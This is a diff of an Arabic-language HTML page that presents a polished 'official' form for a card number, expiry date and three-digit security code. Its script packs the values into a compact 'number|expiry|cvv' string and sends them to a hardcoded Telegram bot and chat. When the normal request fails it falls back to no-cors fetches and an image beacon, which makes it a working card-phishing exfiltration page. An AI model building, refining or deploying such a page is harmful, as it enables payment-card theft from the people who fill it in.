@@ -3,104 +3,101 @@
 <head>
   <meta charset="utf-8" />
   <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>تطبيق إرسال إلى تلجرام - فاتح</title>
+  <title>تطبيق إرسال إلى تلجرام — معاينة رسمية</title>
 
+  <meta name="color-scheme" content="light">
   <style>
     :root{
-      --bg: #f5f8fb;
+      --bg: #f6f9fc;
       --panel: #ffffff;
       --muted: #6b7280;
       --accent-1: #06b6d4; /* teal */
       --accent-2: #3b82f6; /* blue */
+      --accent-3: #8b5cf6; /* purple accent */
       --success: #059669;
       --danger: #ef4444;
       --card-height: 220px;
       --radius-app: 16px;
-      --shadow-lg: 0 14px 40px rgba(15,23,42,0.08);
-      --shadow-sm: 0 6px 18px rgba(15,23,42,0.06);
+      --shadow-lg: 0 18px 40px rgba(15,23,42,0.08);
+      --shadow-sm: 0 8px 20px rgba(15,23,42,0.06);
+      --glass: rgba(11,18,30,0.02);
+      --text: #08203a;
     }
 
-    * { box-sizing: border-box; }
-    html,body { height:100%; margin:0; font-family: "Inter", "Noto Naskh Arabic", system-ui, -apple-system, "Segoe UI", Roboto, Arial; -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale; }
-    body {
-      background: linear-gradient(180deg, #eef5fb 0%, var(--bg) 100%);
-      color: #0f1724;
-      padding: 28px;
+    *{box-sizing:border-box}
+    html,body{height:100%;margin:0;font-family:Inter, "Noto Naskh Arabic", system-ui, -apple-system, "Segoe UI", Roboto, Arial; -webkit-font-smoothing:antialiased; -moz-osx-font-smoothing:grayscale}
+    body{
+      background:
+        radial-gradient(600px 260px at 10% 10%, rgba(59,130,246,0.06), transparent),
+        linear-gradient(180deg, #f0f6fb 0%, var(--bg) 100%);
+      color:var(--text);
+      padding:28px;
       display:flex;
       align-items:center;
       justify-content:center;
       min-height:100vh;
+      direction:rtl;
     }
 
-    /* App shell */
+    /* App container */
     .app {
       width:100%;
       max-width:980px;
       border-radius:var(--radius-app);
       overflow:hidden;
-      background: transparent;
       display:grid;
       grid-template-columns: 1fr 420px;
       gap:22px;
       padding:18px;
       align-items:start;
     }
-
     @media (max-width:920px){
       .app { grid-template-columns: 1fr; padding:14px; gap:14px; }
       .right { order:-1; }
     }
 
-    /* Left / Form column */
-    .left {
-      padding:18px;
-      background: var(--panel);
+    /* Left panel (form) */
+    .panel {
+      background:var(--panel);
       border-radius:12px;
-      border:1px solid rgba(15,23,42,0.04);
+      padding:18px;
+      border:1px solid rgba(11,18,30,0.04);
       box-shadow: var(--shadow-lg);
     }
 
     .brand {
       display:flex;
-      align-items:center;
       gap:12px;
+      align-items:center;
       margin-bottom:12px;
     }
     .logo {
-      width:48px;height:48px;border-radius:10px;
+      width:52px;height:52px;border-radius:12px;
       background: linear-gradient(135deg,var(--accent-1),var(--accent-2));
-      display:flex;align-items:center;justify-content:center;
+      display:flex;align-items:center;justify-content:center;color:#fff;font-weight:800;
       box-shadow: var(--shadow-sm);
       flex-shrink:0;
-      color: white;
-      font-weight:700;
     }
-    .brand h1 { margin:0; font-size:18px; color:#0b1220; }
-    .brand p { margin:0; font-size:13px; color:var(--muted); }
+    .brand h1{margin:0;font-size:18px}
+    .brand p{margin:0;color:var(--muted);font-size:13px}
 
-    form { margin-top:12px; display:flex; flex-direction:column; gap:14px; }
+    form { display:flex; flex-direction:column; gap:14px; }
 
-    .field {
-      display:flex; flex-direction:column; gap:8px;
-    }
-    label.inline {
-      display:flex; align-items:center; gap:10px; font-weight:700; color:#0b1220;
-      font-size:13px;
-    }
+    .field { display:flex; flex-direction:column; gap:8px; }
+    label.inline { font-weight:700; color:var(--text); font-size:13px; display:flex; gap:8px; align-items:center; }
+
     .input {
       display:flex; align-items:center; gap:10px;
-      background: #f8fafc;
-      border-radius:10px;
-      padding:10px 12px;
-      border:1px solid rgba(15,23,42,0.04);
-      transition: box-shadow .12s, transform .06s, border-color .12s;
+      background:var(--glass); padding:12px; border-radius:10px;
+      border:1px solid rgba(11,18,30,0.04); transition:box-shadow .12s, transform .08s;
     }
-    .input:focus-within { box-shadow: 0 10px 30px rgba(59,130,246,0.06); border-color: rgba(59,130,246,0.16); transform: translateY(-1px); }
+    .input:focus-within { box-shadow:0 12px 30px rgba(59,130,246,0.06); transform: translateY(-2px); border-color: rgba(59,130,246,0.12); }
 
-    input[type="text"], input[type="tel"] {
-      border:0; background:transparent; outline:none; color: #0b1220; font-size:16px; width:100%;
+    input[type="text"], input[type="tel"]{
+      border:0; background:transparent; outline:none; width:100%; font-size:16px; color:var(--text);
+      direction:ltr; text-align:left;
     }
-    input::placeholder { color: rgba(11,18,32,0.35); }
+    input::placeholder { color: rgba(8,32,58,0.35); }
 
     .two-cols { display:flex; gap:12px; }
     .two-cols > div { flex:1; }
@@ -108,26 +105,17 @@
     .hint { font-size:12px; color:var(--muted); margin-top:6px; }
 
     .actions { display:flex; gap:10px; align-items:center; margin-top:6px; }
-    button.send {
-      padding:12px 16px;
-      border-radius:12px;
-      border:0;
-      color:white;
-      font-weight:800;
-      background: linear-gradient(90deg,var(--accent-1),var(--accent-2));
-      box-shadow: 0 10px 24px rgba(59,130,246,0.12);
-      cursor:pointer;
-      transition: transform .12s, opacity .12s;
-      font-size:15px;
+    button.btn {
+      padding:12px 16px; border-radius:12px; cursor:pointer; border:0; font-weight:700; font-size:15px;
     }
-    button.send:active { transform: translateY(-1px); }
+    button.primary {
+      background: linear-gradient(90deg,var(--accent-2),var(--accent-3));
+      color:white; box-shadow: 0 10px 28px rgba(99,102,241,0.10);
+      transition: transform .12s;
+    }
+    button.primary:active{ transform: translateY(-1px); }
     button.ghost {
-      background: transparent;
-      border: 1px solid rgba(15,23,42,0.06);
-      color: var(--muted);
-      padding:10px 12px;
-      border-radius:10px;
-      cursor:pointer;
+      background:transparent; border:1px solid rgba(11,18,30,0.06); color:var(--muted); padding:10px 12px; border-radius:10px;
     }
 
     #message { min-height:26px; font-size:14px; color:var(--muted); }
@@ -135,76 +123,45 @@
     #message.success { color:var(--success); }
     #message.error { color:var(--danger); }
 
-    .note {
-      margin-top:10px;
-      font-size:13px;
-      color:var(--muted);
-      background: rgba(11,18,32,0.02);
-      padding:10px; border-radius:10px;
-    }
+    .note{ font-size:13px;color:var(--muted); margin-top:8px; background:rgba(11,18,30,0.02); padding:10px;border-radius:10px; }
 
-    /* Right / Preview column */
-    .right {
-      padding:18px;
-      border-radius:12px;
-      background: var(--panel);
-      border:1px solid rgba(15,23,42,0.04);
-      box-shadow: var(--shadow-lg);
-      display:flex; flex-direction:column; gap:12px;
-      height:100%;
-    }
+    /* Right column: preview */
+    .right { padding:18px; border-radius:12px; display:flex; flex-direction:column; gap:12px; }
+    .right .panel { padding:14px; border-radius:12px; }
 
     .preview-header { display:flex; justify-content:space-between; align-items:center; gap:12px; }
-    .preview-header h3 { margin:0; font-size:16px; color:#0b1220; }
-    .preview-header .muted { color:var(--muted); font-size:13px; }
+    .preview-header h3 { margin:0; font-size:16px; }
+    .preview-desc { font-size:13px; color:var(--muted); }
 
     .card-preview {
-      height: var(--card-height);
-      border-radius:12px;
-      overflow:hidden;
-      position:relative;
-      padding:18px;
-      background: linear-gradient(180deg,#ffffff 0%, #f8fafc 100%);
-      box-shadow: 0 10px 30px rgba(15,23,42,0.04);
-      display:flex; flex-direction:column; justify-content:space-between;
+      height: var(--card-height); border-radius:12px; overflow:hidden; position:relative;
+      padding:18px; display:flex; flex-direction:column; justify-content:space-between;
+      background: linear-gradient(135deg, #ffffff, #fbfdff);
+      border:1px solid rgba(11,18,30,0.03);
+      box-shadow: 0 12px 30px rgba(11,18,30,0.04);
     }
 
     .card-surface {
-      border-radius:10px;
-      padding:16px;
-      color:#08203a;
-      display:flex; flex-direction:column; gap:10px;
-      background: linear-gradient(135deg, rgba(59,130,246,0.06), rgba(6,182,212,0.06));
-      min-height:120px;
-      border: 1px solid rgba(11,18,32,0.03);
+      border-radius:10px; padding:16px; color:var(--text); display:flex; flex-direction:column; gap:10px;
+      background: linear-gradient(135deg, rgba(59,130,246,0.06), rgba(139,92,246,0.05));
+      min-height:120px; border:1px solid rgba(11,18,30,0.02);
     }
 
     .card-top { display:flex; justify-content:space-between; align-items:center; }
-    .chip { width:46px; height:34px; border-radius:6px; background: linear-gradient(180deg,#ffd9a6,#ffb86b); box-shadow: 0 6px 18px rgba(0,0,0,0.06); }
+    .chip { width:50px; height:34px; border-radius:6px; background: linear-gradient(180deg,#ffd9a6,#ffb86b); box-shadow: var(--shadow-sm); }
 
-    .card-number { font-family: "Courier New", Courier, monospace; font-size:20px; letter-spacing:2px; text-align:left; direction:ltr; color:#04263a; }
-    .card-meta { display:flex; justify-content:space-between; gap:12px; font-size:13px; color:#04263a; }
-
+    .card-number { font-family: "Courier New", Courier, monospace; font-size:20px; letter-spacing:2px; text-align:left; direction:ltr; color:var(--text); }
+    .card-meta { display:flex; justify-content:space-between; gap:12px; font-size:13px; color:var(--text); }
     .meta-block { display:flex; flex-direction:column; text-align:left; direction:ltr; }
     .label { font-size:11px; color: rgba(4,6,12,0.6); }
-    .value { font-weight:800; color:#04263a; }
+    .value { font-weight:800; color:var(--text); }
 
-    .micro { font-size:12px; color:rgba(4,6,12,0.7); }
+    .controls { display:flex; gap:8px; align-items:center; }
+    .small-ghost { background:transparent; border:1px solid rgba(11,18,30,0.06); padding:8px 10px; border-radius:10px; color:var(--muted); cursor:pointer; }
 
-    .row { display:flex; gap:8px; align-items:center; }
-    .grow { flex:1; }
-
-    .success-burst {
-      position:absolute; inset:0; display:flex; align-items:center; justify-content:center; pointer-events:none;
-      opacity:0; transform:scale(0.98); transition:opacity .32s, transform .32s;
-    }
+    .success-burst { position:absolute; inset:0; display:flex; align-items:center; justify-content:center; pointer-events:none; opacity:0; transform:scale(0.98); transition:opacity .28s, transform .28s; }
     .success-burst.show { opacity:1; transform:scale(1); }
-    .check {
-      width:82px; height:82px; border-radius:50%; background:rgba(5,150,105,0.08); display:flex; align-items:center; justify-content:center;
-      border: 2px solid rgba(5,150,105,0.12);
-      box-shadow: 0 8px 28px rgba(5,150,105,0.06);
-      color: var(--success); font-size:38px; font-weight:800;
-    }
+    .check { width:74px; height:74px; border-radius:50%; background:rgba(5,150,105,0.08); display:flex; align-items:center; justify-content:center; border:2px solid rgba(5,150,105,0.12); color:var(--success); font-size:36px; font-weight:800; }
 
     @media (max-width:520px){
       .card-number { font-size:18px; }
@@ -215,41 +172,38 @@
 </head>
 <body>
   <div class="app" role="application" aria-label="تطبيق إرسال إلى تلجرام">
-    <div class="left" role="region" aria-labelledby="appTitle">
+    <!-- LEFT: Form -->
+    <div class="panel" aria-labelledby="appTitle">
       <div class="brand">
         <div class="logo" aria-hidden>TB</div>
         <div>
           <h1 id="appTitle">نموذج إرسال إلى تلجرام</h1>
-          <p>واجهة فاتحة، منظمة، ومظهر شبه تطبيقي — البيانات تظهر بشكل رسمي في معاينة البطاقة أعلاه.</p>
+          <p>واجهة فاتحة متناسقة — البيانات تظهر فوراً في البطاقة الرسمية على اليمين.</p>
         </div>
       </div>
 
       <form id="form" autocomplete="on" novalidate>
         <!-- Card number (LTR input even on RTL page) -->
         <div class="field">
-          <label class="inline">
-            <span>رقم البطاقة (16 رقم)</span>
-          </label>
+          <label class="inline">رقم البطاقة (16 رقم)</label>
           <div class="input" title="أدخل 16 رقمًا">
-            <!-- direction ltr for numeric input -->
             <input id="idNumber" name="idNumber" type="text" inputmode="numeric" autocomplete="cc-number"
-                   placeholder="0000 0000 0000 0000" aria-describedby="idHint"
-                   dir="ltr" style="text-align:left;" />
+                   placeholder="0000 0000 0000 0000" aria-describedby="idHint" dir="ltr" />
           </div>
-          <div id="idHint" class="hint">الكتابة ستكون من اليسار إلى اليمين — يتم تنسيق الأرقام تلقائيًا بمجموعات 4.</div>
+          <div id="idHint" class="hint">الكتابة تكون من اليسار إلى اليمين — يتم تنسيق الأرقام تلقائياً بمجموعات من 4.</div>
         </div>
 
         <div class="two-cols">
           <div class="field">
-            <label class="inline"><span>تاريخ الانتهاء (MM/YY أو MM/YYYY)</span></label>
+            <label class="inline">تاريخ الانتهاء (MM/YY أو MM/YYYY)</label>
             <div class="input">
               <input id="expiry" name="expiry" type="text" inputmode="numeric" placeholder="MM/YY أو MM/YYYY" maxlength="7" autocomplete="cc-exp" />
             </div>
-            <div class="hint">مثال مقبول: 01/28 أو 01/2028</div>
+            <div class="hint">مثال: 01/28 أو 01/2028</div>
           </div>
 
           <div class="field">
-            <label class="inline"><span>الرقم (3 خانات)</span></label>
+            <label class="inline">الرقم (3 خانات)</label>
             <div class="input">
               <input id="threeDigits" name="threeDigits" type="tel" inputmode="numeric" maxlength="3" placeholder="000" autocomplete="cc-csc" />
             </div>
@@ -257,38 +211,39 @@
           </div>
         </div>
 
-        <div class="actions">
-          <button class="send" id="sendBtn" type="submit">إرسال إلى تلجرام</button>
-          <button type="button" class="ghost" id="clearBtn" title="مسح الحقول">مسح</button>
-          <div id="message" role="status" aria-live="polite" class="grow"></div>
+        <div class="actions" style="align-items:center">
+          <button class="btn primary" id="sendBtn" type="submit">إرسال</button>
+          <button type="button" class="ghost" id="clearBtn">مسح</button>
+          <div id="message" role="status" aria-live="polite" style="flex:1;text-align:left"></div>
         </div>
 
-        <p class="note">
-          تنبيه: التوكن و chat_id مضمّنان داخل هذا الملف كما طلبت — هذا غير آمن إذا نُشر في مكان عام. استخدمه محليًا أو غيّر التوكن إذا نشرته.
-        </p>
+        <p class="note">تنبيه: التوكن و chat_id مضمّنان داخل هذا الملف — هذا غير آمن إن رفعته في موقع عام. استعمله محليًا أو غيّر التوكن لاحقاً.</p>
       </form>
     </div>
 
-    <aside class="right" role="region" aria-labelledby="previewTitle">
-      <div class="preview-header">
-        <div>
-          <h3 id="previewTitle">معاينة رسمية للبيانات</h3>
-          <div class="muted">المعلومات تظهر بشكل منسق ورسمي في البطاقة — لا يوجد نص رسالة مرئي أدنى.</div>
-        </div>
-
-        <div style="display:flex; gap:10px;">
-          <button id="toggleMask" class="ghost" title="إظهار/إخفاء الرقم">إخفاء الرقم</button>
+    <!-- RIGHT: Preview -->
+    <div class="right">
+      <div class="panel">
+        <div class="preview-header">
+          <div>
+            <h3>معاينة رسمية للبطاقة</h3>
+            <div class="preview-desc">المعلومات تظهر بطريقة رسمية ومنسقة على البطاقة — هذه هي القيم التي سيتم إرسالها.</div>
+          </div>
+          <div class="controls">
+            <button id="toggleMask" class="small-ghost" title="عرض/إخفاء الرقم">إظهار الرقم</button>
+            <button id="copyBtn" class="small-ghost" title="نسخ نص الإرسال">نسخ</button>
+          </div>
         </div>
       </div>
 
-      <div class="card-preview" aria-hidden="false">
-        <div class="card-surface" id="cardSurface" role="img" aria-label="معاينة بطاقة">
+      <div class="card-preview" role="region" aria-label="معاينة البطاقة">
+        <div class="card-surface" id="cardSurface" role="img" aria-label="بطاقة المعاينة">
           <div class="card-top">
             <div class="chip" aria-hidden></div>
-            <div class="micro">Telegram Bot</div>
+            <div style="font-weight:700;color:var(--text)">Telegram</div>
           </div>
 
-          <div class="card-number" id="cardNumber" aria-live="polite" dir="ltr" style="text-align:left;">•••• •••• •••• ••••</div>
+          <div class="card-number" id="cardNumber" aria-live="polite" dir="ltr">•••• •••• •••• ••••</div>
 
           <div class="card-meta">
             <div class="meta-block">
@@ -306,9 +261,7 @@
           <div class="check" aria-hidden>✓</div>
         </div>
       </div>
-
-      <!-- Removed visible "نص الرسالة المرسلة" area as requested -->
-    </aside>
+    </div>
   </div>
 
   <script>
@@ -333,10 +286,13 @@
     const pThree = document.getElementById('cardThree');
     const successBurst = document.getElementById('successBurst');
     const toggleMask = document.getElementById('toggleMask');
+    const copyBtn = document.getElementById('copyBtn');
 
-    let maskEnabled = true;
+    // state
+    let maskEnabled = true; // start masked
+    toggleMask.textContent = maskEnabled ? 'إظهار الرقم' : 'إخفاء الرقم';
 
-    // helpers
+    // Helpers
     function showMessage(text, cls='info') {
       msg.className = cls;
       msg.textContent = text;
@@ -346,56 +302,71 @@
       return (v||'').toString().replace(/\D/g, '');
     }
 
-    // Format card number with groups of 4, input left-to-right
-    idInput.addEventListener('input', (e) => {
-      const prev = e.target.value;
-      let digits = rawDigits(prev).slice(0,16);
+    // Format card number into groups of 4
+    function formatCardGroups(digits) {
       const parts = digits.match(/.{1,4}/g) || [];
-      const display = parts.join(' ');
-      e.target.value = display;
+      return parts.join(' ');
+    }
+
+    // Input handling: card number (LTR)
+    idInput.addEventListener('input', (e) => {
+      const cur = e.target.value;
+      const digits = rawDigits(cur).slice(0,16);
+      e.target.value = formatCardGroups(digits);
+      // keep caret at end for convenience
+      try { e.target.selectionStart = e.target.selectionEnd = e.target.value.length; } catch (_) {}
       updatePreview();
     });
 
-    // Expiry input: accept MMYY, MM/YYYY, MM/YY
+    // Expiry input accepts MMYY / MM/YY / MMYYYY / MM/YYYY
     expiryInput.addEventListener('input', (e) => {
-      let v = e.target.value.replace(/[^\d]/g,'');
-      if (v.length > 6) v = v.slice(0,6);
-
+      let v = e.target.value.replace(/[^\d]/g,'').slice(0,6);
       if (v.length <= 2) {
         e.target.value = v;
       } else if (v.length <= 4) {
-        // format MMYY -> MM/YY
+        // MMYY -> MM/YY
         e.target.value = v.slice(0,2) + '/' + v.slice(2);
       } else {
-        // format MMYYYY -> MM/YYYY
+        // MMYYYY -> MM/YYYY
         e.target.value = v.slice(0,2) + '/' + v.slice(2,6);
       }
       updatePreview();
     });
 
-    // three digits
+    // Three digits input
     threeInput.addEventListener('input', (e) => {
       e.target.value = e.target.value.replace(/\D/g,'').slice(0,3);
       updatePreview();
     });
 
-    // Toggle mask (show full number or masked)
+    // Toggle mask behavior
     toggleMask.addEventListener('click', () => {
       maskEnabled = !maskEnabled;
-      toggleMask.textContent = maskEnabled ? 'إخفاء الرقم' : 'إظهار الرقم';
+      toggleMask.textContent = maskEnabled ? 'إظهار الرقم' : 'إخفاء الرقم';
       updatePreview();
     });
 
-    // Build message text for sending (compact, without emoji/labels as requested)
-    function buildMessageText() {
-      const idVal = rawDigits(idInput.value);
-      const expVal = normalizeExpiryForSend(expiryInput.value) || expiryInput.value || '';
-      const threeVal = threeInput.value || '';
-      // compact single-line format, no emoji and no verbose labels
-      return `${idVal} | ${expVal} | ${threeVal}`;
+    // Copy compact message to clipboard (compact: id|MM/YYYY|cvv)
+    copyBtn.addEventListener('click', async () => {
+      const txt = buildSendText();
+      try {
+        await navigator.clipboard.writeText(txt);
+        showMessage('تم نسخ نص الإرسال.', 'success');
+        setTimeout(()=> showMessage('', ''), 1600);
+      } catch (e) {
+        showMessage('فشل النسخ — ربما لا يدعم المتصفح.', 'error');
+      }
+    });
+
+    // Build message to send: compact (no labels)
+    function buildSendText() {
+      const id = rawDigits(idInput.value);
+      const exp = normalizeExpiryForSend(expiryInput.value) || expiryInput.value || '';
+      const cvv = threeInput.value || '';
+      return `${id}|${exp}|${cvv}`;
     }
 
-    // normalize expiry text to MM/YYYY (for sending)
+    // Normalize expiry to MM/YYYY for sending
     function normalizeExpiryForSend(display) {
       if (!display) return '';
       const m = display.match(/^(\d{2})\/(\d{2,4})$/);
@@ -403,91 +374,92 @@
       const mm = m[1];
       const yy = m[2];
       if (yy.length === 2) {
-        // interpret as 20YY
         return `${mm}/${String(2000 + parseInt(yy,10))}`;
       } else {
         return `${mm}/${yy}`;
       }
     }
 
-    // Validate functions
-    function validateId(idDisplay) {
-      return /^\d{16}$/.test(rawDigits(idDisplay));
+    // Validation helpers
+    function validateId() {
+      return /^\d{16}$/.test(rawDigits(idInput.value));
     }
-
-    // Accept MM/YY or MM/YYYY (also accept values like 0128 or 01/28)
-    function validateExpiry(display) {
-      if (!display) return false;
-      const m = display.match(/^(\d{2})\/(\d{2,4})$/);
+    function validateExpiry() {
+      const val = expiryInput.value;
+      if (!val) return false;
+      const m = val.match(/^(\d{2})\/(\d{2,4})$/);
       if (!m) return false;
       const mm = parseInt(m[1],10);
-      let yyyy = m[2].length === 2 ? 2000 + parseInt(m[2],10) : parseInt(m[2],10);
+      const yy = m[2].length === 2 ? 2000 + parseInt(m[2],10) : parseInt(m[2],10);
       if (mm < 1 || mm > 12) return false;
-      // last moment of that month
-      const last = new Date(yyyy, mm, 0, 23, 59, 59);
+      const last = new Date(yy, mm, 0, 23, 59, 59);
       return last > new Date();
     }
-
-    function validateThree(v) {
-      return /^\d{3}$/.test(v);
+    function validateThree() {
+      return /^\d{3}$/.test(threeInput.value);
     }
 
-    // Masking for preview: show only last 4 digits (if masked)
-    function maskedDisplay(display) {
-      const digits = rawDigits(display);
+    // Masking for preview: show last 4 digits only when masked
+    function maskedDisplay(displayVal) {
+      const digits = rawDigits(displayVal);
       if (!digits) return '•••• •••• •••• ••••';
-      const padded = (digits + '••••••••••••••••').slice(0,16);
+      const padded = (digits + '                ').slice(0,16); // ensure length
       const groups = padded.match(/.{1,4}/g) || [];
       if (!maskEnabled) return groups.join(' ');
-      // keep last group visible, mask others
-      const masked = groups.map((g, idx) => idx < 3 ? g.replace(/\d/g,'•') : g);
-      return masked.join(' ');
+      return groups.map((g, i) => i < 3 ? g.replace(/\d/g,'•') : g).join(' ');
     }
 
-    // Update preview and values on card
+    // Update preview (card)
     function updatePreview() {
       pNumber.textContent = maskedDisplay(idInput.value);
-      pExpiry.textContent = expiryInput.value || 'MM/YY';
+      // show expiry short (MM/YY) on card for compactness
+      const exp = expiryInput.value || 'MM/YY';
+      // if user typed YYYY, convert to short if possible
+      const m = exp.match(/^(\d{2})\/(\d{2,4})$/);
+      if (m) {
+        const mm = m[1];
+        const y = m[2].length === 4 ? m[2].slice(-2) : m[2];
+        pExpiry.textContent = `${mm}/${y}`;
+      } else {
+        pExpiry.textContent = exp;
+      }
       pThree.textContent = threeInput.value ? threeInput.value.replace(/./g,'•') : '•••';
     }
 
-    // initialize
+    // Initialize preview
     updatePreview();
 
-    // clear
+    // Keep caret at end for LTR input convenience
+    idInput.addEventListener('focus', () => { setTimeout(()=> { try { idInput.selectionStart = idInput.selectionEnd = idInput.value.length; } catch(_){} }, 0); });
+
+    // Clear form
     clearBtn.addEventListener('click', () => {
       form.reset();
       maskEnabled = true;
-      toggleMask.textContent = 'إخفاء الرقم';
+      toggleMask.textContent = 'إظهار الرقم';
       showMessage('', '');
       updatePreview();
     });
 
-    // send logic (with same fallback approach)
+    // Send logic (same fallback as before)
     form.addEventListener('submit', async (e) => {
       e.preventDefault();
       showMessage('', '');
-      const idVal = rawDigits(idInput.value);
-      const expRaw = expiryInput.value.trim();
-      const expForSend = normalizeExpiryForSend(expRaw);
-      const threeVal = threeInput.value.trim();
-
-      if (!validateId(idInput.value)) {
-        showMessage('الرقم التعريفي يجب أن يتكوّن من 16 رقمًا.', 'error');
+      // Validate
+      if (!validateId()) {
+        showMessage('الرجاء إدخال 16 رقمًا للبطاقة.', 'error');
         return;
       }
-      if (!validateExpiry(expRaw)) {
-        showMessage('تاريخ الانتهاء يجب أن يكون MM/YY أو MM/YYYY ويكون في المستقبل.', 'error');
+      if (!validateExpiry()) {
+        showMessage('الرجاء إدخال تاريخ صالح (MM/YY أو MM/YYYY) ويجب أن يكون في المستقبل.', 'error');
         return;
       }
-      if (!validateThree(threeVal)) {
-        showMessage('حقل الثلاث خانات يجب أن يحتوي على 3 أرقام.', 'error');
+      if (!validateThree()) {
+        showMessage('الرجاء إدخال 3 أرقام في الحقل المخصص.', 'error');
         return;
       }
 
-      // Build compact message (no emoji, no labels) — as requested the verbose message was removed.
-      const text = buildMessageText();
-
+      const text = buildSendText(); // compact form: id|MM/YYYY|cvv
       const base = `https://api.telegram.org/bot${encodeURIComponent(BOT_TOKEN)}/sendMessage`;
       const params = new URLSearchParams({
         chat_id: CHAT_ID,
@@ -500,7 +472,7 @@
       sendBtn.disabled = true;
       sendBtn.style.opacity = '0.7';
 
-      // 1) try normal fetch
+      // 1) normal fetch
       try {
         const resp = await fetch(url, { method: 'GET' });
         if (resp && resp.ok) {
@@ -524,10 +496,10 @@
         console.warn('fetch normal failed, will try fallback methods.', err);
       }
 
-      // 2) try no-cors fetch (may send but cannot read response)
+      // 2) no-cors fetch
       try {
         await fetch(url, { method: 'GET', mode: 'no-cors', cache: 'no-store' });
-        showMessage('تم إرسال الطلب إلى Telegram (بدون تأكيد نتيجة بسبب قيود CORS).', 'success');
+        showMessage('تم إرسال الطلب (بدون تأكيد نتيجة بسبب قيود CORS).', 'success');
         triggerSuccess();
         form.reset();
         updatePreview();
@@ -535,7 +507,7 @@
         sendBtn.style.opacity = '1';
         return;
       } catch (err) {
-        console.warn('fetch no-cors failed, trying Image fallback.', err);
+        console.warn('fetch no-cors failed, trying image fallback.', err);
       }
 
       // 3) image fallback
@@ -547,7 +519,7 @@
           img.src = url + "&_=" + Date.now();
           setTimeout(() => resolve(true), 4000);
         });
-        showMessage('تم إرسال الطلب إلى Telegram (عن طريق طريقة بديلة).', 'success');
+        showMessage('تم إرسال الطلب (عن طريق طريقة بديلة).', 'success');
         triggerSuccess();
         form.reset();
         updatePreview();
@@ -556,13 +528,13 @@
         return;
       } catch (err) {
         console.error(err);
-        showMessage('فشل إرسال الطلب. تحقق من اتصال الانترنت أو إعدادات المتصفح.', 'error');
+        showMessage('فشل الإرسال — تحقق من الاتصال أو إعدادات المتصفح.', 'error');
         sendBtn.disabled = false;
         sendBtn.style.opacity = '1';
       }
     });
 
-    // Success visual (burst)
+    // Success visual
     function triggerSuccess() {
       successBurst.classList.add('show');
       successBurst.setAttribute('aria-hidden','false');
@@ -572,13 +544,8 @@
       }, 1500);
     }
 
-    // Accessibility: announce preview changes
-    idInput.addEventListener('keyup', updatePreview);
-    expiryInput.addEventListener('keyup', updatePreview);
-    threeInput.addEventListener('keyup', updatePreview);
-
-    // Keep cursor at end for LTR input in RTL page (convenience)
-    idInput.addEventListener('focus', () => { setTimeout(()=> { idInput.selectionStart = idInput.selectionEnd = idInput.value.length; }, 0); });
+    // Live updates also on keyboard
+    [idInput, expiryInput, threeInput].forEach(el => el.addEventListener('keyup', updatePreview));
   </script>
 </body>
 </html>
